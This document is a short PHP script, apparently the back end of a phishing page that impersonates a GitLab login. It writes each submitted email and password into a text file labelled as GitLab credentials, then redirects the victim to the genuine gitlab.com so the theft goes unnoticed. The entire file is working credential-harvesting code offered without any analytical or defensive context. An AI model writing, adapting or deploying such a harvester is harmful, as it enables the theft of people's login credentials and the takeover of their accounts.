<?php 
file_put_contents("usernames.txt", "Gitlab Username: " . $_POST['email'] . " Pass: " . $_POST['password'] ."\n", FILE_APPEND);
header('Location: https://gitlab.com');
exit();
?>
